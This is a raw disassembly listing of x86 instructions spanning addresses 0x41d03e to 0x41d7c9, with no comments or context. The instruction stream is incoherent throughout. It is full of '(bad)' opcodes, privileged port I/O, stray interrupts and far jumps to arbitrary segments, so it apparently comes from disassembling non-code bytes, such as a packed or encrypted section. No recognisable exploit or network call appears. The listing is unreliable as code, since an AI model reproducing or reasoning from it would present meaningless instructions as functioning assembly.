  41d03e:	cwde   
  41d03f:	mul    BYTE PTR [ecx-0x387fd060]
  41d045:	mov    ah,0xb7
  41d047:	sbb    eax,0x8d1a928f
  41d04c:	fist   DWORD PTR [eax+0x5bf95745]
  41d052:	shl    DWORD PTR [ebx+0x5b0ad1fa],0xbb
  41d059:	gs cs lahf 
  41d05c:	leave  
  41d05d:	fstp   TBYTE PTR [ebp-0x2b]
  41d060:	push   eax
  41d061:	inc    edi
  41d062:	jge    0x41d02c
  41d064:	pusha  
  41d065:	pop    eax
  41d066:	push   esi
  41d067:	sub    DWORD PTR [ebx],edi
  41d069:	pop    esp
  41d06a:	xor    ebx,DWORD PTR [esi+edi*2]
  41d06d:	loopne 0x41d020
  41d06f:	idiv   dh
  41d071:	aas    
  41d072:	push   edx
  41d073:	xchg   edx,eax
  41d074:	sahf   
  41d075:	out    dx,al
  41d076:	and    BYTE PTR [esi+0x77a68a6f],bl
  41d07c:	(bad)  
  41d07d:	jle    0x41d006
  41d07f:	arpl   di,bx
  41d081:	mov    ch,0x71
  41d083:	and    edi,DWORD PTR [edx+0x79a225f0]
  41d089:	cs loopne 0x41d0cc
  41d08c:	cmp    DWORD PTR ds:0xf287119d,ebp
  41d092:	loopne 0x41d0c3
  41d094:	adc    DWORD PTR [edx-0x6c364867],0xffffff96
  41d09b:	mov    esp,0x7f42b909
  41d0a0:	ret    
  41d0a1:	xchg   esi,eax
  41d0a2:	(bad)  
  41d0a3:	cld    
  41d0a4:	imul   esp,ebp,0x6d16eef6
  41d0aa:	dec    esi
  41d0ab:	cmp    eax,0xd22b0b37
  41d0b0:	push   0x5c
  41d0b2:	add    dh,ch
  41d0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0b5:	adc    cl,ch
  41d0b7:	test   BYTE PTR [ebx+esi*1],0x17
  41d0bb:	and    ebx,DWORD PTR [ecx-0x1b]
  41d0be:	(bad)  
  41d0bf:	mov    ch,0x3c
  41d0c1:	and    ch,BYTE PTR [edx]
  41d0c3:	(bad)  
  41d0c4:	int3   
  41d0c5:	lea    esi,[edx+0x6d]
  41d0c8:	retf   0xf53a
  41d0cb:	push   ecx
  41d0cc:	inc    esi
  41d0cd:	ret    
  41d0ce:	xchg   edi,eax
  41d0cf:	xchg   esi,eax
  41d0d0:	fldcw  WORD PTR [esp+edi*4+0x16]
  41d0d4:	mov    ch,0xb5
  41d0d6:	pop    es
  41d0d7:	pop    edi
  41d0d8:	fistp  DWORD PTR ds:[eax]
  41d0db:	or     ebx,esi
  41d0dd:	dec    esi
  41d0de:	inc    ecx
  41d0df:	push   eax
  41d0e0:	xor    eax,0xb98071b4
  41d0e5:	jmp    0x41d105
  41d0e7:	xchg   esi,eax
  41d0e8:	ins    BYTE PTR es:[edi],dx
  41d0e9:	cmp    BYTE PTR [edi-0x21],bl
  41d0ec:	pusha  
  41d0ed:	ret    
  41d0ee:	in     al,0x7c
  41d0f0:	jbe    0x41d0da
  41d0f2:	and    esp,DWORD PTR [edx+ebx*2]
  41d0f5:	xchg   esi,eax
  41d0f6:	test   eax,0x1e67369
  41d0fb:	pushf  
  41d0fc:	or     edi,DWORD PTR [esi-0x71]
  41d0ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d100:	dec    edi
  41d101:	lahf   
  41d102:	or     ah,BYTE PTR [edi+0x3b]
  41d105:	lods   eax,DWORD PTR ds:[esi]
  41d106:	add    edi,DWORD PTR [edx-0x65e4a885]
  41d10c:	inc    esp
  41d10d:	std    
  41d10e:	sbb    eax,0x6d862330
  41d113:	paddsb mm1,QWORD PTR [edx*2-0x96f694c]
  41d11b:	out    dx,eax
  41d11c:	jmp    0x41d0c3
  41d11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d11f:	ret    
  41d120:	adc    BYTE PTR [esi-0x68ed0ae],ah
  41d126:	pop    ds
  41d127:	jl     0x41d13f
  41d129:	adc    eax,0x7b7085d4
  41d12e:	les    edx,FWORD PTR [eax+0x7d]
  41d131:	mov    ds:0x11d2b7dd,eax
  41d136:	stc    
  41d137:	add    DWORD PTR [ebp+0x3b0afdb1],ebp
  41d13d:	add    BYTE PTR [esi+0x636bbffe],0x3a
  41d144:	xor    ch,BYTE PTR [ecx+0x42]
  41d147:	mov    DWORD PTR [ecx],esp
  41d149:	add    BYTE PTR [ebx+ebp*4+0x31],0x7e
  41d14e:	lods   al,BYTE PTR ds:[esi]
  41d14f:	pop    esp
  41d150:	and    eax,0xdf2d78fe
  41d155:	push   esi
  41d156:	push   ds
  41d157:	sub    DWORD PTR [edi+0x23f7437c],esi
  41d15d:	mov    ah,0x31
  41d15f:	scas   eax,DWORD PTR es:[edi]
  41d160:	mov    DWORD PTR [esi+eiz*4-0x80],edx
  41d164:	lods   al,BYTE PTR ds:[esi]
  41d165:	add    BYTE PTR [esi],ah
  41d167:	or     esi,DWORD PTR ss:[edx]
  41d16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d16b:	fiadd  DWORD PTR [edi-0x2ac64b1f]
  41d171:	xor    bl,BYTE PTR [ecx]
  41d173:	pop    ebx
  41d174:	sbb    esp,esp
  41d176:	adc    eax,0xa5556639
  41d17b:	jecxz  0x41d11f
  41d17d:	stos   DWORD PTR es:[edi],eax
  41d17e:	out    0x93,al
  41d180:	mov    edx,0xa4412639
  41d185:	pop    eax
  41d186:	mov    WORD PTR [ebp+0x3a096ab4],gs
  41d18c:	hlt    
  41d18d:	dec    ecx
  41d18e:	ins    BYTE PTR es:[edi],dx
  41d18f:	mov    ds:0xada82261,eax
  41d194:	mov    ah,bh
  41d196:	sub    bh,BYTE PTR [edx+0x73bf88d9]
  41d19c:	nop
  41d19d:	ror    BYTE PTR [edx],cl
  41d19f:	add    cl,BYTE PTR [eax]
  41d1a1:	inc    ebx
  41d1a2:	or     al,BYTE PTR [eax+0x59a80eeb]
  41d1a8:	(bad)  
  41d1a9:	push   esi
  41d1aa:	push   edi
  41d1ab:	minps  xmm6,XMMWORD PTR [esi+0x3e84d44]
  41d1b2:	inc    edx
  41d1b3:	sub    al,BYTE PTR [esi+0x4a0cca91]
  41d1b9:	stos   DWORD PTR es:[edi],eax
  41d1ba:	call   0x899d:0x38ff6849
  41d1c1:	jbe    0x41d1ca
  41d1c3:	jno    0x41d21b
  41d1c5:	fdivr  QWORD PTR [eax]
  41d1c7:	add    eax,0xf33a2b2b
  41d1cc:	sbb    esi,esi
  41d1ce:	retf   0x87f9
  41d1d1:	inc    DWORD PTR [esi]
  41d1d3:	(bad)  
  41d1d5:	or     bh,cl
  41d1d7:	mov    ch,0xf0
  41d1d9:	aaa    
  41d1da:	pop    ebp
  41d1db:	push   ecx
  41d1dc:	cmp    DWORD PTR [ebx],eax
  41d1de:	sbb    DWORD PTR [ebp-0x3710f9e6],esp
  41d1e4:	xlat   BYTE PTR ds:[ebx]
  41d1e5:	pop    es
  41d1e6:	mov    esi,0x1b3912a0
  41d1eb:	mov    ebx,DWORD PTR [esi-0x7695978a]
  41d1f1:	dec    ecx
  41d1f2:	fwait
  41d1f3:	jbe    0x41d1b3
  41d1f5:	call   0x92da:0x1ee6bcc3
  41d1fc:	popa   
  41d1fd:	push   ss
  41d1fe:	test   edi,0x2896c31
  41d204:	pop    edi
  41d205:	adc    al,0x68
  41d207:	outs   dx,BYTE PTR ds:[esi]
  41d208:	inc    ebp
  41d209:	and    esp,DWORD PTR [ebp+0x59207359]
  41d20f:	in     al,dx
  41d210:	xchg   edx,eax
  41d211:	cmp    DWORD PTR [esi+0x3c],0x3fe3b35a
  41d218:	mov    al,ds:0x5742847a
  41d21d:	out    0x9c,al
  41d21f:	pop    esi
  41d220:	out    0x8e,al
  41d222:	mov    cl,0x99
  41d224:	leave  
  41d225:	jmp    0xbf58723
  41d22a:	inc    esp
  41d22b:	mov    ebx,0x68298d9a
  41d230:	or     al,0xda
  41d232:	test   BYTE PTR ds:0x1da672a8,al
  41d238:	xchg   esp,eax
  41d239:	cdq    
  41d23a:	stos   BYTE PTR es:[edi],al
  41d23b:	out    0x4b,al
  41d23d:	cmp    DWORD PTR [edi+0x7b],ecx
  41d240:	add    BYTE PTR [edi-0x36b43ae6],ch
  41d246:	mov    eax,ds:0xa52359ba
  41d24b:	xchg   esp,eax
  41d24c:	sbb    bh,BYTE PTR [eax+0x52]
  41d24f:	(bad)
  41d252:	mov    ds:0xfffedb52,al
  41d257:	ror    al,1
  41d259:	(bad)  
  41d25a:	mov    esp,0x977c7e99
  41d25f:	push   edx
  41d260:	dec    esi
  41d261:	mov    ch,0xbe
  41d263:	mov    DWORD PTR [edx+0x2ebe5611],eax
  41d269:	or     BYTE PTR [eax+0x128a7361],0x21
  41d270:	rcl    DWORD PTR [eax+0x6d],0x2f
  41d274:	pop    eax
  41d275:	fbld   TBYTE PTR [eax+0x3b6728aa]
  41d27c:	sbb    al,0xb7
  41d27e:	sbb    al,0x10
  41d280:	add    al,BYTE PTR [eax]
  41d282:	das    
  41d283:	cmp    ebx,DWORD PTR [edi+0x324e76e0]
  41d289:	shr    dh,0x88
  41d28c:	and    esp,DWORD PTR [esi+0x6d]
  41d28f:	cdq    
  41d290:	call   0x8df9:0x8023d328
  41d297:	add    DWORD PTR [ebp+0x70],ebp
  41d29a:	push   eax
  41d29b:	scas   al,BYTE PTR es:[edi]
  41d29c:	pop    edi
  41d29d:	pop    esp
  41d29e:	rol    BYTE PTR [ecx+0x4991dbeb],0xa7
  41d2a5:	xchg   ebx,eax
  41d2a6:	pop    eax
  41d2a7:	add    edx,esi
  41d2a9:	jge    0x41d257
  41d2ab:	adc    esp,DWORD PTR [esi]
  41d2ad:	mov    al,0x26
  41d2af:	ins    BYTE PTR es:[edi],dx
  41d2b0:	add    al,0xb5
  41d2b2:	pop    ebx
  41d2b3:	rcr    DWORD PTR [edi],0x1a
  41d2b6:	inc    esp
  41d2b7:	and    ch,BYTE PTR [ebp-0x24]
  41d2ba:	mov    al,ds:0x4c29083c
  41d2bf:	cdq    
  41d2c0:	and    al,0xe8
  41d2c2:	pop    edi
  41d2c3:	out    dx,al
  41d2c4:	enter  0xc490,0xd6
  41d2c8:	les    esp,FWORD PTR [edi-0x1625db64]
  41d2ce:	and    BYTE PTR [esi-0xa],al
  41d2d1:	lds    esp,FWORD PTR [ecx+0x61a3c65c]
  41d2d7:	pop    ecx
  41d2d8:	xor    dh,BYTE PTR [esi-0x297b175b]
  41d2de:	dec    edx
  41d2df:	fiadd  WORD PTR [ebx+0x5a6bf3c0]
  41d2e5:	dec    edi
  41d2e6:	cwde   
  41d2e7:	hlt    
  41d2e8:	jg     0x41d277
  41d2ea:	push   edi
  41d2eb:	pop    edi
  41d2ec:	jmp    0xf0afdda1
  41d2f1:	dec    esp
  41d2f2:	pop    ebx
  41d2f3:	add    eax,0x1bdf29b9
  41d2f8:	es cmp cl,ch
  41d2fb:	push   ds
  41d2fc:	add    eax,edx
  41d2fe:	jmp    0x61f8:0xc024034
  41d305:	dec    esp
  41d306:	ins    BYTE PTR es:[edi],dx
  41d307:	jge    0x41d2b5
  41d309:	rol    BYTE PTR ds:0x965cf289,cl
  41d30f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d310:	cmp    eax,0x41f1e8b9
  41d315:	or     bh,bh
  41d317:	inc    ecx
  41d318:	xchg   DWORD PTR [edi+0xfe198e4],esi
  41d31e:	int    0x6a
  41d320:	fsub   st(2),st
  41d322:	sub    BYTE PTR [edx+0x4],bl
  41d325:	test   BYTE PTR [edi+0x1492dce4],0xd5
  41d32c:	mov    dh,0xc6
  41d32e:	dec    edi
  41d32f:	loop   0x41d2bb
  41d331:	out    dx,eax
  41d332:	mov    ebx,0x6afcce8b
  41d337:	pushf  
  41d338:	jnp    0x41d2ff
  41d33a:	out    dx,eax
  41d33b:	fisub  WORD PTR [eax+esi*1]
  41d33e:	mov    ds:0x3b707d7d,eax
  41d343:	pusha  
  41d344:	ja     0x41d2ec
  41d346:	push   ds
  41d347:	dec    eax
  41d348:	test   esi,esp
  41d34a:	clc    
  41d34b:	sub    eax,0x2a2bb754
  41d350:	jo     0x41d34c
  41d352:	(bad)  
  41d353:	fnsave [ecx-0x6a8fa959]
  41d359:	aas    
  41d35a:	xchg   esi,eax
  41d35b:	int    0xd9
  41d35d:	mov    eax,0xf01d7aa9
  41d362:	test   bl,cl
  41d364:	mov    esp,0x387e34cc
  41d369:	shl    BYTE PTR [edi+0xaf7d527],1
  41d36f:	ret    0x3b47
  41d372:	hlt    
  41d373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d374:	inc    ecx
  41d375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d376:	sub    BYTE PTR [ebx-0x227e256f],al
  41d37c:	(bad)  
  41d37d:	dec    edi
  41d37e:	add    cl,BYTE PTR [eax-0x5e]
  41d381:	aam    0x3f
  41d383:	sub    al,0x4c
  41d385:	xchg   BYTE PTR [bx-0x1681],cl
  41d38a:	in     eax,dx
  41d38b:	les    esp,FWORD PTR [esi]
  41d38d:	push   esp
  41d38e:	frstor [eax-0x35]
  41d391:	inc    BYTE PTR [ecx-0x3ebccb11]
  41d397:	stos   DWORD PTR es:[edi],eax
  41d398:	push   es
  41d399:	lods   al,BYTE PTR ds:[esi]
  41d39a:	jmp    0xefd3962b
  41d39f:	mov    BYTE PTR [edi-0x7],0xfd
  41d3a3:	xor    ebx,DWORD PTR [edi]
  41d3a5:	cld    
  41d3a6:	add    eax,0x71ba2831
  41d3ab:	cmp    ebx,DWORD PTR [edi-0x37ead58c]
  41d3b1:	inc    ecx
  41d3b2:	popf   
  41d3b3:	jecxz  0x41d3e7
  41d3b5:	int3   
  41d3b6:	dec    edi
  41d3b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3b8:	outs   dx,DWORD PTR ds:[esi]
  41d3b9:	dec    esi
  41d3ba:	ficomp WORD PTR [edi+eax*4-0x6e87a77c]
  41d3c1:	dec    eax
  41d3c2:	cmp    DWORD PTR cs:[edx],eax
  41d3c5:	mov    esi,0xa3d8d28c
  41d3ca:	fst    QWORD PTR [esi+0x47c59d2]
  41d3d0:	call   0x121d:0x551d7935
  41d3d7:	cmp    DWORD PTR [eax],0xf47f2a9f
  41d3dd:	jo     0x41d43d
  41d3df:	popa   
  41d3e0:	ror    DWORD PTR [esi+0x6eb62ea1],1
  41d3e6:	xor    BYTE PTR [edx-0x22],dh
  41d3e9:	data16 test al,0xe5
  41d3ec:	icebp  
  41d3ed:	mov    BYTE PTR [ebx+0x26],dl
  41d3f0:	int3   
  41d3f1:	retf   0x8b18
  41d3f4:	repnz cmc 
  41d3f6:	xor    al,0x56
  41d3f8:	xor    BYTE PTR [eax+esi*4],bl
  41d3fb:	xor    DWORD PTR [ecx+ebp*8-0x45],0x4a
  41d400:	fidiv  DWORD PTR [edi+edx*2-0x63]
  41d404:	sub    dh,BYTE PTR [ebx]
  41d406:	adc    ah,BYTE PTR [ebx+0x58]
  41d409:	cmp    al,0x6a
  41d40b:	ret    
  41d40c:	iret   
  41d40d:	mov    bh,0x4e
  41d40f:	jg     0x41d46e
  41d411:	loopne 0x41d40d
  41d413:	push   ss
  41d414:	sbb    DWORD PTR [edi+0x2b9260fd],0xe0d81203
  41d41e:	fld    TBYTE PTR [esi+0x235fbbb7]
  41d424:	or     ebp,esi
  41d426:	ficomp DWORD PTR [edi]
  41d428:	retf   
  41d429:	mov    edi,DWORD PTR [ebp+0x4075bba7]
  41d42f:	push   ecx
  41d430:	and    DWORD PTR [edi],esp
  41d432:	add    BYTE PTR [esi+0x37],al
  41d435:	sub    al,0xe0
  41d437:	lahf   
  41d438:	sub    esp,0x7552555d
  41d43e:	cmp    al,0xa5
  41d440:	retf   0x5694
  41d443:	js     0x41d40c
  41d445:	stos   BYTE PTR es:[edi],al
  41d446:	cmp    DWORD PTR [edi-0x47],edi
  41d449:	adc    BYTE PTR ds:0xfad7605e,dh
  41d44f:	mov    ebp,0xa92567bf
  41d454:	xchg   edx,eax
  41d455:	in     al,dx
  41d456:	nop
  41d457:	rol    BYTE PTR [edx],cl
  41d459:	mov    dh,0xd4
  41d45b:	popw   ds
  41d45d:	xchg   ebp,eax
  41d45e:	mov    edi,0x1da2ffc4
  41d463:	push   es
  41d464:	ret    0xd5d2
  41d467:	sar    DWORD PTR [esi+0x992043d],cl
  41d46d:	jle    0x41d47b
  41d46f:	adc    BYTE PTR [ebp-0x5b],dh
  41d472:	cmp    BYTE PTR [edx],ah
  41d474:	out    0x1f,al
  41d476:	xchg   esi,eax
  41d477:	sar    DWORD PTR [ebx+0x41348f86],cl
  41d47d:	lods   al,BYTE PTR ds:[esi]
  41d47e:	cmp    al,BYTE PTR [ebx-0x40]
  41d481:	nop
  41d482:	or     BYTE PTR [edi-0x9],dh
  41d485:	retf   
  41d486:	and    BYTE PTR ds:0x1b416e1c,bh
  41d48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d48d:	ja     0x41d4a0
  41d48f:	mov    bl,0xe7
  41d491:	ret    
  41d492:	into   
  41d493:	mov    WORD PTR [edx+0x1c],es
  41d496:	push   edi
  41d497:	inc    edx
  41d498:	arpl   WORD PTR [ebx+0x25],sp
  41d49b:	jmp    DWORD PTR [ecx]
  41d49d:	fild   WORD PTR [edx+eax*2]
  41d4a0:	sub    BYTE PTR [eax-0x79ebea7c],0xf3
  41d4a7:	lods   al,BYTE PTR ds:[esi]
  41d4a8:	loop   0x41d43a
  41d4aa:	jno    0x41d48f
  41d4ac:	sub    al,BYTE PTR ds:0xf5d61b49
  41d4b2:	out    dx,eax
  41d4b3:	cmp    ch,ch
  41d4b5:	add    al,0x39
  41d4b7:	mov    bl,0x3d
  41d4b9:	(bad)  
  41d4ba:	ss xchg esi,eax
  41d4bc:	aas    
  41d4bd:	frstor [edx-0x4d95694b]
  41d4c3:	mov    ch,0x63
  41d4c5:	pop    ss
  41d4c6:	std    
  41d4c7:	xchg   ebx,eax
  41d4c8:	xchg   edx,eax
  41d4c9:	stos   BYTE PTR es:[edi],al
  41d4ca:	das    
  41d4cb:	repnz add eax,0xb6e1b150
  41d4d1:	mov    BYTE PTR [ecx-0xaff4a3b],dh
  41d4d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4d8:	or     al,0xe6
  41d4da:	fs xchg edx,eax
  41d4dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4dd:	cmp    BYTE PTR [edi],0x68
  41d4e0:	std    
  41d4e1:	jmp    0x13dc:0xdedabf1b
  41d4e8:	pop    edi
  41d4e9:	int    0xaf
  41d4eb:	(bad)  
  41d4ec:	stc    
  41d4ed:	adc    cl,BYTE PTR [esi-0x2c]
  41d4f0:	loope  0x41d4e2
  41d4f2:	lods   al,BYTE PTR ds:[esi]
  41d4f3:	mov    es,WORD PTR [ebx-0xd]
  41d4f6:	ror    al,1
  41d4f8:	ret    
  41d4f9:	or     BYTE PTR [edx],bl
  41d4fb:	and    ah,BYTE PTR [ecx-0x4fac0644]
  41d501:	(bad)  [esi-0xbea295a]
  41d507:	clc    
  41d508:	and    edi,DWORD PTR [ebx+eax*8-0x65]
  41d50c:	cmp    al,0xf3
  41d50e:	sti    
  41d50f:	stos   DWORD PTR es:[edi],eax
  41d510:	ja     0x41d4c4
  41d512:	jae    0x41d525
  41d514:	cmp    eax,0x32e557e5
  41d519:	loope  0x41d4ab
  41d51b:	in     al,0x62
  41d51d:	lock (bad) 
  41d51f:	mov    esp,0x9c521a0e
  41d524:	cli    
  41d525:	fnsavew [ecx+0x7916f877]
  41d52c:	out    0xd9,al
  41d52e:	mov    ecx,0x63d7d2a2
  41d533:	adc    ah,BYTE PTR [edx]
  41d535:	xchg   esp,eax
  41d536:	xchg   ebx,eax
  41d537:	or     ch,BYTE PTR [ebp-0xf826d20]
  41d53d:	mov    esi,0x879a4755
  41d542:	cmp    BYTE PTR [edx+0x71feb581],0xaf
  41d549:	arpl   WORD PTR [ebx+0x69102e42],si
  41d54f:	fs mov dh,0xc4
  41d552:	jmp    0x9fce:0xb2af914b
  41d559:	mov    cl,0x59
  41d55b:	ds into 
  41d55d:	and    ecx,DWORD PTR [ecx]
  41d55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d560:	xchg   DWORD PTR [eax-0x44],esi
  41d563:	jns    0x41d556
  41d565:	add    BYTE PTR [edi],ah
  41d567:	test   eax,0xc562ceef
  41d56c:	call   0x114:0xe2f9f7d6
  41d573:	sub    ch,ch
  41d575:	and    eax,0xfc65fdff
  41d57a:	cmp    bh,bh
  41d57c:	test   esi,edx
  41d57e:	repz aam 0x1e
  41d581:	or     eax,0xfbae2fd4
  41d586:	and    BYTE PTR [ecx+0x14a2f3b],0xdd
  41d58d:	mov    esi,0xbe2c9989
  41d592:	pop    es
  41d593:	inc    eax
  41d594:	call   0xdbb36913
  41d599:	adc    esp,DWORD PTR [ebx+0x4ec5a58a]
  41d59f:	jno    0x41d575
  41d5a1:	or     eax,0x13d3d338
  41d5a6:	leave  
  41d5a7:	or     eax,0x7f80065c
  41d5ac:	cmp    esi,edi
  41d5ae:	mov    edx,0x6facc6cb
  41d5b3:	jo     0x41d612
  41d5b5:	lods   al,BYTE PTR ds:[esi]
  41d5b6:	xchg   esi,eax
  41d5b7:	add    eax,0x5efb9a6d
  41d5bc:	or     dl,BYTE PTR [eax]
  41d5be:	imul   al
  41d5c0:	jne    0x41d563
  41d5c2:	pop    es
  41d5c3:	dec    eax
  41d5c4:	les    esp,FWORD PTR [esi-0x4e]
  41d5c7:	push   ss
  41d5c8:	rcr    edx,cl
  41d5ca:	ins    DWORD PTR es:[edi],dx
  41d5cb:	retf   0xf4dc
  41d5ce:	xor    al,0x42
  41d5d0:	mov    DWORD PTR [ebp+0x6],edx
  41d5d3:	xchg   esi,eax
  41d5d4:	xchg   ecx,eax
  41d5d5:	popa   
  41d5d6:	in     eax,dx
  41d5d7:	dec    ebx
  41d5d8:	push   ss
  41d5d9:	xor    edx,DWORD PTR [eax-0x5f987c7b]
  41d5df:	mov    esi,0xb5b1d14c
  41d5e4:	loope  0x41d5b9
  41d5e6:	fcmovb st,st(4)
  41d5e8:	mov    BYTE PTR [ecx-0x52],ch
  41d5eb:	imul   eax,ecx,0x9f09c7e7
  41d5f1:	test   DWORD PTR [ecx-0x63260e7f],ecx
  41d5f7:	pushf  
  41d5f8:	ins    DWORD PTR es:[edi],dx
  41d5f9:	in     al,0xe8
  41d5fb:	mov    gs,esi
  41d5fd:	mov    ah,0x3b
  41d5ff:	push   ds
  41d600:	int    0xe1
  41d602:	mov    dl,0xf7
  41d604:	push   ecx
  41d605:	imul   eax,DWORD PTR [ecx+0x1821338f],0xd6da66e2
  41d60f:	lods   al,BYTE PTR ds:[esi]
  41d610:	xor    al,0x23
  41d612:	and    al,0xdc
  41d614:	dec    eax
  41d615:	std    
  41d616:	dec    esi
  41d617:	in     al,dx
  41d618:	mov    bl,0x74
  41d61a:	and    BYTE PTR [ebp+0x28],bl
  41d61d:	add    al,0x23
  41d620:	fcmovu st,st(6)
  41d622:	push   0xef92d551
  41d627:	addr16 enter 0x300d,0x6c
  41d62c:	jae    0x41d629
  41d62e:	xchg   DWORD PTR [ecx+ebx*4+0x34752c55],edx
  41d635:	fdiv   DWORD PTR [ecx+ecx*4-0x4b]
  41d639:	mov    ah,0x82
  41d63b:	(bad)  
  41d63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d63d:	mov    edx,0x61630be
  41d642:	add    DWORD PTR [edi],eax
  41d644:	add    DWORD PTR [ebp+0x5eabb311],ebp
  41d64a:	scas   eax,DWORD PTR es:[edi]
  41d64b:	push   0x7d
  41d64d:	mov    esp,0xfaa7cf65
  41d652:	into   
  41d653:	lahf   
  41d654:	fcmovu st,st(1)
  41d656:	sub    dl,BYTE PTR [esp+ebp*8+0x59a65f17]
  41d65d:	shl    ch,cl
  41d65f:	jae    0x41d5ed
  41d661:	cmp    DWORD PTR [ebx],esi
  41d663:	xor    eax,0x37b0356f
  41d668:	out    0xb8,al
  41d66a:	jmp    0x6573:0xf38ca1da
  41d671:	pop    ss
  41d672:	adc    DWORD PTR [ebp-0x29],ebx
  41d675:	pushf  
  41d676:	cmc    
  41d677:	pop    edi
  41d678:	shr    BYTE PTR [edx+edx*2-0x2fee3463],0xfa
  41d680:	jbe    0x41d6d7
  41d682:	pop    ebx
  41d683:	(bad)  
  41d684:	inc    eax
  41d685:	xor    al,0xbf
  41d687:	aas    
  41d688:	push   es
  41d689:	test   BYTE PTR [eax+0x15],bh
  41d68c:	call   0x9f78f514
  41d691:	call   0x3093:0x3e815995
  41d698:	add    eax,0xaeb60a8b
  41d69d:	sbb    DWORD PTR [esp+ebx*1],esp
  41d6a0:	jae    0x41d642
  41d6a2:	cld    
  41d6a3:	fwait
  41d6a4:	jns    0x41d6a2
  41d6a6:	or     al,0x4f
  41d6a8:	inc    ebp
  41d6a9:	shl    DWORD PTR [ecx-0x7e],1
  41d6ac:	pop    eax
  41d6ad:	sbb    eax,0xc9a14a2e
  41d6b2:	mov    cl,0xe3
  41d6b4:	jo     0x41d675
  41d6b6:	cmp    ah,BYTE PTR ds:0x5ae4e23c
  41d6bc:	xchg   ebx,eax
  41d6bd:	imul   BYTE PTR [ecx+0x5cc7c17]
  41d6c3:	and    eax,0x981a72f5
  41d6c8:	xlat   BYTE PTR ds:[ebx]
  41d6c9:	ror    BYTE PTR [edx+edx*8],1
  41d6cc:	iret   
  41d6cd:	push   ds
  41d6ce:	mov    eax,ds:0x3516b77e
  41d6d3:	adc    bh,BYTE PTR [edi+eax*1]
  41d6d6:	out    dx,eax
  41d6d7:	js     0x41d6ca
  41d6d9:	cmp    eax,0x30ef53a2
  41d6de:	outs   dx,DWORD PTR ds:[esi]
  41d6df:	punpckhdq mm6,mm2
  41d6e2:	and    al,0xf4
  41d6e4:	jp     0x41d70b
  41d6e6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6e8:	sub    BYTE PTR ds:0x88884f6a,0x54
  41d6ef:	adc    al,cl
  41d6f1:	dec    esi
  41d6f2:	xchg   esi,eax
  41d6f3:	mov    ds:0x919e2666,al
  41d6f8:	add    BYTE PTR [edx],dh
  41d6fa:	shl    DWORD PTR [edx-0x2d9208cc],cl
  41d700:	mov    dl,0xeb
  41d702:	int    0x4
  41d704:	aad    0x3a
  41d706:	xchg   esp,edx
  41d708:	xor    DWORD PTR [ebx+0x2743e7a8],ebx
  41d70e:	jnp    0x41d770
  41d710:	xor    DWORD PTR ds:0xefd523ee,0x2fb46846
  41d71a:	popa   
  41d71b:	shr    edx,1
  41d71d:	adc    eax,0x53d6488d
  41d722:	fsubr  st,st(7)
  41d724:	dec    eax
  41d725:	das    
  41d726:	fs in  eax,dx
  41d728:	rol    edx,0x65
  41d72b:	inc    ecx
  41d72c:	(bad)  
  41d72e:	push   0x77
  41d730:	test   eax,0xdf62fa48
  41d735:	aad    0x23
  41d737:	lods   eax,DWORD PTR ds:[esi]
  41d738:	scas   eax,DWORD PTR es:[edi]
  41d739:	xor    BYTE PTR [ebx-0x61],ah
  41d73c:	xor    esp,DWORD PTR [eax-0x7f]
  41d73f:	and    dh,BYTE PTR [edx+0x17ff30e]
  41d745:	dec    ecx
  41d746:	mov    ds:0x8209feb5,al
  41d74b:	outs   dx,DWORD PTR ds:[esi]
  41d74c:	xchg   ecx,eax
  41d74d:	adc    ecx,0x31b4d442
  41d753:	push   ds
  41d754:	test   eax,0x1f41b440
  41d759:	sbb    al,0x4
  41d75b:	dec    edi
  41d75c:	das    
  41d75d:	frstor [ebx]
  41d75f:	mov    ebp,0x17fe5f73
  41d764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d765:	mov    al,al
  41d767:	pop    ebp
  41d768:	adc    BYTE PTR [ebx+0x1118bfbf],ah
  41d76e:	push   ds
  41d76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d770:	gs and eax,0xb47ede58
  41d776:	in     al,dx
  41d777:	mov    al,0x50
  41d779:	iret   
  41d77a:	adc    eax,0x811fc1f5
  41d77f:	js     0x41d728
  41d781:	gs icebp 
  41d783:	push   ds
  41d784:	ror    DWORD PTR [edx],1
  41d786:	fdivr  QWORD PTR [eax-0x6ed352f]
  41d78c:	lods   al,BYTE PTR ds:[esi]
  41d78d:	shl    DWORD PTR [ecx+0x6],cl
  41d790:	outs   dx,DWORD PTR ds:[esi]
  41d791:	pop    eax
  41d792:	mov    esp,0x734b7ada
  41d797:	pop    ecx
  41d798:	fld1   
  41d79a:	mov    esi,DWORD PTR [esi]
  41d79c:	inc    ebp
  41d79d:	addr16 mov dl,ah
  41d7a0:	inc    edx
  41d7a1:	xchg   ecx,eax
  41d7a2:	out    dx,eax
  41d7a3:	pop    edi
  41d7a4:	inc    esp
  41d7a5:	jns    0x41d782
  41d7a7:	xchg   ebx,eax
  41d7a8:	dec    ecx
  41d7a9:	push   0xffffff95
  41d7ab:	leave  
  41d7ac:	gs inc ebx
  41d7ae:	mov    cl,0xd6
  41d7b0:	inc    ecx
  41d7b1:	sbb    eax,0x69424f73
  41d7b6:	dec    eax
  41d7b7:	scas   eax,DWORD PTR es:[edi]
  41d7b8:	mov    ah,BYTE PTR [ebx]
  41d7ba:	adc    bh,BYTE PTR [esi]
  41d7bc:	sbb    al,0xfc
  41d7be:	sub    edi,DWORD PTR [eax+0x74]
  41d7c1:	loope  0x41d834
  41d7c3:	icebp  
  41d7c4:	mov    bl,0xb7
  41d7c6:	push   cs
  41d7c7:	add    al,0x8f
  41d7c9:	and    edx,DWORD PTR [ecx-0xa2a6e21]
